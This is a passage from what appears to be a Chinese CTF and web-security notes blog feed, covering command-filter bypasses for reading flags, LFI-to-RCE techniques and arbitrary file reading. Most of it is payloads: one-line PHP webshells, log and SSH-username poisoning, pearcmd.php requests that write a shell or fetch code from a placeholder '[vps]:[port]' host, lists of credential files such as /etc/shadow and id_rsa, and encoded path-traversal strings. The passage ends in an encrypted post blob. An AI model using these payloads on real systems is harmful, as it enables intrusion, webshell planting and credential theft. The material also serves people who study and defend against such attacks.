class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs smalltalk">tac&lt;/fla\g.php||<br>awk%<span class="hljs-number">09</span><span class="hljs-string">&#x27;/f/&#123;print&#125;&#x27;</span>%<span class="hljs-number">09</span>/fla?||<br>uniq<span class="hljs-string">$&#123;</span><span class="hljs-type">IFS</span>&#125;/f???<br>/???/????<span class="hljs-number">64</span> /????<br>uniq `expr substr <span class="hljs-string">$P</span>ATH <span class="hljs-number">11</span>`f*<br>od -c <span class="hljs-string">$&#123;</span><span class="hljs-type">OLDPWD</span>&#125;flag<br>cat <span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-number">0</span>:<span class="hljs-number">1</span>&#125;f*<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#LESS</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-type">SHLVL</span>&#125;&#125;   <span class="hljs-symbol">#ls</span><br><span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#HOME</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125; ?<span class="hljs-string">$&#123;</span><span class="hljs-type">PATH</span>:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#RANDOM</span>&#125;:<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;??   #应该是这个：nl flag<br><span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">PWD</span>::<span class="hljs-string">$&#123;</span><span class="hljs-symbol">#SHLVL</span>&#125;&#125;?<span class="hljs-string">$&#123;</span><span class="hljs-type">USER</span>:~<span class="hljs-type">A</span>&#125;? ????   #/bin/cat flag<br>&lt;<span class="hljs-type">A</span>;<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;???<span class="hljs-string">$&#123;</span><span class="hljs-type">HOME</span>::<span class="hljs-string">$?</span>&#125;?????<span class="hljs-string">$&#123;</span><span class="hljs-type">RANDOM</span>::<span class="hljs-string">$?</span>&#125; ????      #/bin/base64 flag<br></code></pre></td></tr></table></figure><h3 id="无参数-无数字字母RCE"><a href="#无参数-无数字字母RCE" class="headerlink" title="无参数&#x2F;无数字字母RCE"></a>无参数&#x2F;无数字字母RCE</h3><p>参考<a href="https://xz.aliyun.com/t/8107#toc-0%E3%80%81https://xz.aliyun.com/t/9360">https://xz.aliyun.com/t/8107#toc-0、https://xz.aliyun.com/t/9360</a></p><p>过滤system <code>popen()</code>、<code>passthru()</code>、<code>proc_open()</code>、<code>pcntl_exec()</code>、<code>shell_exec()</code></p><h4 id="1-一些常用函数"><a href="#1-一些常用函数" class="headerlink" title="(1)一些常用函数"></a>(1)一些常用函数</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print_r</span><span class="hljs-params">()</span></span> 打印字符串（可以用连接符）、数组、对象。<br><span class="hljs-function"><span class="hljs-title">scandir</span><span class="hljs-params">()</span></span> 扫描目录下的文件<br><span class="hljs-function"><span class="hljs-title">current</span><span class="hljs-params">()</span></span> 返回数组中的当前单元, 默认取第一个值。<br><span class="hljs-function"><span class="hljs-title">localeconv</span><span class="hljs-params">()</span></span> 返回一包含本地数字及货币格式信息的数组<br><span class="hljs-function"><span class="hljs-title">pos</span><span class="hljs-params">()</span></span> 与current差不多<br>可以执行<span class="hljs-selector-tag">a</span>(<span class="hljs-selector-tag">b</span>(<span class="hljs-built_in">c</span>()))形式时，<span class="hljs-built_in">print_r</span>(<span class="hljs-built_in">scandir</span>(<span class="hljs-built_in">current</span>(<span class="hljs-built_in">localeconv</span>()))) 读当前目录文件<br></code></pre></td></tr></table></figure><h4 id="2-读取文件函数"><a href="#2-读取文件函数" class="headerlink" title="(2)读取文件函数"></a>(2)读取文件函数</h4><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">file_get_contents</span>() 把整个文件读入一个字符串中<br><span class="hljs-built_in">file</span>() 把整个文件读入一个数组中;<br><span class="hljs-built_in">readfile</span>() 读入一个文件并写入到输出缓冲;<br><span class="hljs-built_in">highlight_file</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">show_source</span>() 对文件进行语法高亮显示;<br><span class="hljs-built_in">array_flip</span>() 将读取当前目录的键和值进行反转<br><span class="hljs-built_in">array_rand</span>() 随机输出键<br></code></pre></td></tr></table></figure><h2 id="LFI-to-RCE"><a href="#LFI-to-RCE" class="headerlink" title="LFI_to_RCE"></a>LFI_to_RCE</h2><p>example：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="图片马getshell"><a href="#图片马getshell" class="headerlink" title="图片马getshell"></a>图片马getshell</h3><p>条件：<br><code>allow_url_include=on</code><br><code>allow_url_fopen=on</code></p><p>图片马内容，会在当前目录下生成shell.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h3 id="临时文件-phpinfo条件竞争getshell、"><a href="#临时文件-phpinfo条件竞争getshell、" class="headerlink" title="临时文件+phpinfo条件竞争getshell、"></a>临时文件+phpinfo条件竞争getshell、</h3><p>基本没遇到过，写个思路以及别人的方法，遇到了再深入</p><p><a href="https://blog.csdn.net/qq_43576303/article/details/119105376">思路</a>：实质上是连续传输很大的字节到服务器导致删除文件有时间差，包含临时的&#x2F;tmp&#x2F;6字节长度文件名php </p><p><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">脚本</a>：python2的脚本</p><h3 id="日志getshell"><a href="#日志getshell" class="headerlink" title="日志getshell"></a>日志getshell</h3><h4 id="apache日志文件"><a href="#apache日志文件" class="headerlink" title="apache日志文件"></a>apache日志文件</h4><p>条件：<br>apache日志文件路径已知，或配置文件路径已知，有可读权限</p><p>先看<code>/etc/init.d/httpd</code>或<code>/etc/httpd/conf/httpd.conf</code>找到log文件路径</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">/<span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">fputs</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;/var/www/html/shell.php&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>),<span class="hljs-string">&#x27;&lt;? @eval($_POST[1]);?&gt;&#x27;</span>);<span class="hljs-meta">?&gt;</span><br><br>payload：<br>?file=/usr/local/apache/logs/error_log<br>?file=/usr/local/apache/logs/access_log<br><br>?file=shell.php<br></code></pre></td></tr></table></figure><h4 id="ssh日志文件"><a href="#ssh日志文件" class="headerlink" title="ssh日志文件"></a>ssh日志文件</h4><p>条件<br>SSH日志路径已知，有可读权限</p><p>将ssh用户名写为php马，ssh自动写入<code>/var/log/auth.log</code></p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml">ssh &#x27;</span><span class="language-php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span></span><span class="language-xml">&#x27;@192.168.136.143</span><br><span class="language-xml"></span><br><span class="language-xml">payload：</span><br><span class="language-xml">?file=/var/log/auth.log</span><br></code></pre></td></tr></table></figure><h3 id="Session文件包含getshell"><a href="#Session文件包含getshell" class="headerlink" title="Session文件包含getshell"></a>Session文件包含getshell</h3><p>条件：<br><code>php&gt;=5.4</code><br><code>session.upload_progress.enable = on</code><br>已知<code>session.save_path</code></p><p>分为两种</p><ol><li>session.upload_progress.cleanup &#x3D; on</li></ol><p>文件会清空，需要条件竞争</p><ol><li>session.upload_progress.cleanup &#x3D; off</li></ol><p>文件不会清空，直接包含<code>session.save_path+session.upload_progress.prefix+session_id</code>文件</p><h3 id="pearcmd-php文件包含getshell"><a href="#pearcmd-php文件包含getshell" class="headerlink" title="pearcmd.php文件包含getshell"></a>pearcmd.php文件包含getshell</h3><p>条件<br>安装了pear扩展<br>已知<code>pearcmd.php</code>路径(默认路径是<code>/usr/local/lib/php/pearcmd.php</code>)<br><code>register_argc_argv=on</code>（只有开启了，<code>$_SERVER[&#39;argv&#39;]</code>才会生效。）</p><p>三种方法</p><p>config-create</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=@<span class="hljs-built_in">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);?&gt;+/tmp/test.php<br></code></pre></td></tr></table></figure><p>install</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+install+</span>--installroot<span class="hljs-code">+&amp;file=/usr/local/lib/php/pearcmd.php&amp;+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test.php<br></code></pre></td></tr></table></figure><p>download</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">?<span class="hljs-code">+download+</span><span class="hljs-link">http://</span>[<span class="hljs-string">vps</span>]:[port]/test1.php&amp;file=/usr/local/lib/php/pearcmd.php<br></code></pre></td></tr></table></figure><p>具体参考：<a href="https://xilitter.github.io/2023/01/31/%E5%88%A9%E7%94%A8pearcmd-php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%8B%BFshell%EF%BC%88LFI%EF%BC%89/index.html">pearcmd文件包含getshell</a></p><h2 id="文件读取利用"><a href="#文件读取利用" class="headerlink" title="文件读取利用"></a>文件读取利用</h2><h3 id="常见读取的敏感文件路径"><a href="#常见读取的敏感文件路径" class="headerlink" title="常见读取的敏感文件路径"></a>常见读取的敏感文件路径</h3><p>参考<a href="https://www.buaq.net/go-161450.html">https://www.buaq.net/go-161450.html</a></p><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs Plain">C:\boot.ini //查看系统版本<br>C:\Windows\System32\inetsrv\MetaBase.xml //IIS配置文件<br>C:\Windows\repair\sam //存储系统初次安装的密码<br>C:\Program Files\mysql\my.ini //Mysql配置<br>C:\Program Files\mysql\data\mysql\user.MYD //Mysql root<br>C:\Windows\php.ini //php配置信息<br>C:\Windows\my.ini //Mysql配置信息<br></code></pre></td></tr></table></figure><h4 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h4><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/authorized_keys /</span><span class="hljs-operator">/</span>如需登录到远程主机，需要到.ssh目录下，新建authorized_keys文件，并将id_rsa.pub内容复制进去<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_rsa /</span><span class="hljs-operator">/</span>ssh私钥,ssh公钥是id_rsa.pub<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/id_ras.keystore /</span><span class="hljs-operator">/</span>记录每个访问计算机用户的公钥<br><span class="hljs-regexp">/root/</span>.ssh<span class="hljs-regexp">/known_hosts  /</span><span class="hljs-regexp">/ssh会把每个访问过计算机的公钥(public key)都记录在~/</span>.ssh<span class="hljs-operator">/</span>known_hosts<span class="hljs-operator">。</span>当下次访问相同计算机时，<span class="hljs-type">OpenSSH会核对公钥</span><span class="hljs-operator">。</span>如果公钥不同，<span class="hljs-type">OpenSSH会发出警告，</span> 避免你受到<span class="hljs-type">DNS</span> <span class="hljs-type">Hijack之类的攻击</span><span class="hljs-operator">。</span><br><span class="hljs-regexp">/etc/</span>passwd <span class="hljs-comment">// 账户信息</span><br><span class="hljs-regexp">/etc/</span>shadow <span class="hljs-comment">// 账户密码文件</span><br><span class="hljs-regexp">/etc/</span>my.cnf <span class="hljs-comment">//mysql 配置文件</span><br><span class="hljs-regexp">/etc/</span>httpd<span class="hljs-regexp">/conf/</span>httpd.conf <span class="hljs-comment">// Apache配置文件</span><br><span class="hljs-regexp">/etc/</span>redhat<span class="hljs-operator">-</span>release 系统版本 <br><span class="hljs-regexp">/root/</span>.bash_history <span class="hljs-comment">//用户历史命令记录文件</span><br><span class="hljs-regexp">/root/</span>.mysql_history <span class="hljs-comment">//mysql历史命令记录文件</span><br><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/mlocate/</span>mlocate.db <span class="hljs-comment">//全文件路径</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/fd/</span>fd[<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">9</span>]<span class="hljs-operator">*</span>(文件标识符)<br><span class="hljs-regexp">/proc/</span>mounts <span class="hljs-comment">//记录系统挂载设备</span><br><span class="hljs-regexp">/porc/</span>config.gz <span class="hljs-comment">//内核配置文件</span><br><span class="hljs-regexp">/porc/</span><span class="hljs-keyword">self</span><span class="hljs-regexp">/cmdline /</span><span class="hljs-operator">/</span>当前进程的cmdline参数<br><span class="hljs-regexp">/proc/</span>sched_debug 配置文件可以看到当前运行的进程并可以获得对应进程的pid<br><span class="hljs-regexp">/proc/</span>pid<span class="hljs-operator">/</span>cmdline   则可以看到对应pid进程的完整命令行<span class="hljs-operator">。</span><br><span class="hljs-regexp">/proc/</span>net<span class="hljs-operator">/</span>fib_trie   内网<span class="hljs-type">IP</span><br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>environ   环境变量<br><span class="hljs-regexp">/proc/</span><span class="hljs-keyword">self</span><span class="hljs-operator">/</span>loginuid   当前用户<br></code></pre></td></tr></table></figure><h3 id="绕过思路"><a href="#绕过思路" class="headerlink" title="绕过思路"></a>绕过思路</h3><p>可以进行fuzz</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs llvm">url编码代替.或者/，如使用<span class="hljs-variable">%2</span>F代替/<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>F..<span class="hljs-variable">%2</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>二次编码(<span class="hljs-variable">%25</span>)<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>F..<span class="hljs-variable">%252</span>Fetc<span class="hljs-variable">%2</span>Fpasswd<br>加入+<br>?filename<span class="hljs-operator">=</span>.+./.+./bin/redacted.dll<br><span class="hljs-variable">%00</span><br>?filename<span class="hljs-operator">=</span>.<span class="hljs-variable">%00</span>./file.php/etc/passwd<span class="hljs-variable">%00</span>.jpg<br>\<br>?filename<span class="hljs-operator">=</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>..<span class="hljs-variable">%5</span><span class="hljs-keyword">c</span>/windows/win.iniJava <br><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span> 安全模式绕过<br>?filename<span class="hljs-operator">=</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure><h3 id="Linux下的常见利用姿势"><a href="#Linux下的常见利用姿势" class="headerlink" title="Linux下的常见利用姿势"></a>Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件"><a href="#用户目录下的敏感文件" class="headerlink" title="用户目录下的敏感文件"></a>用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure><p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。 PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p><h4 id="全路径"><a href="#全路径" class="headerlink" title="全路径"></a>全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<br><code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<br><code>locate mlocate.db config</code><br><code>locate mlocate.db webapps</code><br><code>locate mlocate.db www</code> </p><p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p><h4 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF&#x2F;web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p><h4 id="应用配置文件"><a href="#应用配置文件" class="headerlink" title="应用配置文件"></a>应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p><ul><li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br> <code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li><li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li><li>nginx<br><code>/www/nginx/conf/nginx.conf</code> <code>/etc/nginx/nginx.conf</code> <code>/usr/local/nginx/conf/nginx.conf</code> <code>/usr/local/etc/nginx/nginx.conf</code></li><li>apache<br><code>/etc/httpd/conf/httpd.conf</code> <code>/etc/apache2/apache2.conf</code> <code>/etc/apache2/httpd.conf</code></li><li>redis<br><code>/etc/redis.conf</code></li><li>ssh<br><code>/etc/ssh/sshd_config</code></li></ul><h4 id="应用日志文件"><a href="#应用日志文件" class="headerlink" title="应用日志文件"></a>应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p><ul><li>tomcat 可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径 <code>/webapps/ROOT/logs/catalina.out</code></li><li>apache<br> <code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></li><li>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></li></ul><h3 id="Windows下的利用姿势"><a href="#Windows下的利用姿势" class="headerlink" title="Windows下的利用姿势"></a>Windows下的利用姿势</h3><h4 id="盲读取桌面文件"><a href="#盲读取桌面文件" class="headerlink" title="盲读取桌面文件"></a>盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>文件包含</tag>
      
      <tag>lfi</tag>
      
      <tag>rce</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>文件上传</title>
    <link href="/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    <url>/2023/01/01/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="密码错误。" data-whm="此文章不能被修改。">  <script id="hbeData" type="hbeData" data-hmacdigest="1d51a04eea9d6e1cb4aa5d99e95b9e56f06fcac4b0ac17ce1a7d2d4f8266e468">3c7b49972398798ff56b3ee1d5c7cebf0243040549ad41d0a4f857629952e498161816a31c5b355731c98f0c6373a68453d39dd9daabc67baf2cc62e019f54ecec0375a37b5204107a94febea52f90d2989f105ac63e9ed1a57c5294044ae8b81b0e7a25d93fe6e93723fbd4a4a3f81bf55fdf9575135b656c15f261a6414236e2fd30cce576616b2dcb50b9bf5eed4470a6e4660113f9d96eff435493a6845eaac0a8f4a064bf2879318c590c2dea138a773c4a3f6f60af52fcfeda82af33b2cc807edd8cbcbcacf77a09bbde1ba3a7445e6bc0fbf20fb6a971b5dfbf18862648baab9d403a020c4de4c0729f954aa662386ded6a972a168f8cdce3184bec66d3158bf8561615b6a25c07eb22d1210596cde9ff2bea00c3ea0b32f208a7f8b4f097f585e31e7b8bcb2b1ee978d1bbfef552895a20b6d953c49d0dbea9044babd0a132a125951dfa55ddbe99dc38a7d785da24c200133c34a52c083356c7269823db022a2ea5b4dcd6b3e4a881aa9b95a0285fd5c608b8f39c5bf8ad97140118e0133d284a8c23c434ccb4c64522ff8d2c127f78618eeea68725eb3c16cc0cd886fc6bc7b86d1dd5de4a6ff0a879ab95febc0bebb00a0cd1d73e553ffa39c29f22191857b9350c2852440b9b744a86c7ce54748d0888b2b7cf08669fde6af433a7a9a8b121f9282269dc2951b2ac02452fa5613de1436050c47bc15df120081fe1a24006c0a38863fda73787f8d951d350328d9824602dad95783019c9771f7cf444f0163a71438caada58dbb52d699d3e76629eeae48252fd597185bc51f2f8933f7371ef0e3c89fb727afa7aa859973312e23b2e63538965aabda6ce72455161306d968e66be63082db16f94f4795014b35dfb6e2d29e81fd5e7cdc23e76eefd58628c4e4d75a4eaae59866813d303b17544890f7e7dd8d524d9a9c64ef51c53950da6898a285936c60dc23ebcf8933a28f6c0cb6ddf1ddd2012381350061f87106076e512ca4edca7074e92591bac8a0285297bde459330a2c7edb73923105ef02b221764d9c9a811458bd808da5d2cda9831785a4755ade977800bd368654b4b81883e38cf4f1057adcdb38f3ffb05385d82a91f3ea92bcd4a70165f46d03e1077cdfdaf4e1babe441a588e046db82889bb1748ef63e8d324e91e24f91b70178f0a5ec0f71b7c07edb85b7cbd211e7db8054aa1d7ed8ed0855a02d3d1b2029fdf208672f407ce52b34ed1794e76d76004267cb6db3ab599ebd16f764f43fe16d78e27087ca7728660c67c66ea1e8c111026cd02a769d679f20d0e7c0e20b661565fa5132a04d20114bea8f95d76a84f2eadbca8517bce2d7d313854db429259f81e307548be9fbe5f8671fae79643e27bfb3101cbff60fa05d275edbd5b71693dc3fd048abeb0440c4ec253131199b668254558a894d4d1d1b2babe8be55342697475b094415e1ba544bfa1f8a539e9cf8837234ee7eb74b2d64d1409e33a4664b35214dc78a10d4f92fc42f4566adf8b4c248b3c01d0cd3195a85d80acd23210ae13c98f5a7215bfa3ae41c1d7ad713a0ea4bb2734539b6932ced4a7c5a98f7d7b2502fac078b6c8ba397123c4585525429825791bb17639783579c08988a39f6adf603627fa18316825def1d0ca057f18bbfb6b2bbeb8d2ea6fa774f93f37f4c2a91b633c1abd437d4fc98c6449e84c80a809852a2ed93699353d378461b8e08f88c784ee710fb8391930ecd3599d64bfae4fc0b4590e746bb7726b4a00d41affa37f4b892776fabb29f2af7925b075678d9e52a596d20e57d63649154628cf7dc3429e22dcc2b2e4a5c588d977cbe3efb18368a60a29e76531e00ef8f37002fd10997638f8dfb79fe8973e27a1b1b1657a3517b6b7a630f94aea613b1e3be6c1142fb8ff7eab27a77552aeb9947ecc7cb19c7e56fcb6f2a4b69c7c1eab420dfd700ec46fde2b7d51c1e9eeb9360d82e66cda62f76bdd48993ab0309878b9183dc75ce6f36eb64071d88428c95a7aeeed393a2d5bc530b2416b2437d8e8354b4559af6d720745d525c97bff1f0c86b4be8e64ed81f4618e790e22a69f7b43f5635736184b36a973deb8b29afdb649184f2b84ef2215a8a2c27469d6b777c0985af068a43ff268ee6ae89cd1cde0d779505167b5275ead22f875d4bf798da5bcfea5e81767953355150bb186a49b40fefb4e1347982dbcb77af292deb7e0d83cd20fd4adad847b50d8114c660f35bb00a68f828753ae5605f4b76d84a9fcc11ea1e1af7f63f1e9a90ed1ebd77e74bff305aaf603cf49c3606ca2970186413f3e97026572e88c5ca8866b8dc496c3062ac7187fd90a2957e15f4a9a37887f399be4f0b5a851b1d5bd59d6c2e71b39eb3bf64f6bdd9c57ff8cbe159e726e7b789ca8847305d0a2fb79aae4e99be6754389127a733f0d526f2837abcae1b34fef74adbdfc421c82ed4250a9fe50d37965a39e4193f14af382b8bd7206704fa8860e55466500ed39f022d3006177c644a7c52183e5f35c498bb614e105070b0f32ba164e3d60d26c427ecc52799605fb9fe66621a0f7bdb346d72482ef9393519896316470a392a55baba23745dd272fa544ccaf92c787b3f64c5d5b62962931707633f62c632c8a788c2cd9489f99d4e3343292e94761c7f11fa51092adb8e4e7af9dec2e34b09b202d5272caf7adb130b9612db114dfd3b5f818fe9813f0de056afa0d6b0a0756c7b53